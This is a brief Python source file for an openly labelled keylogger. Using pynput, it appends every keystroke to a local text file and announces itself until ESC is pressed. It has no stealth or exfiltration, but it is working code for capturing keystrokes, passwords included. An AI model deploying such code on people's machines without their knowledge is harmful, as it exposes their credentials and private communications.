from pynput import keyboard

# File to store keystrokes
log_file = "keylog.txt"

# This function will be called on every key press
def on_press(key):
    if key == keyboard.Key.esc:
        # Stop the keylogger when ESC is pressed
        print("ESC pressed, stopped keylogger.")
        return False
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start listening to the keyboard
with keyboard.Listener(on_press=on_press) as listener:
    print("Keylogger is running... Press ESC to stop.")
    listener.join()
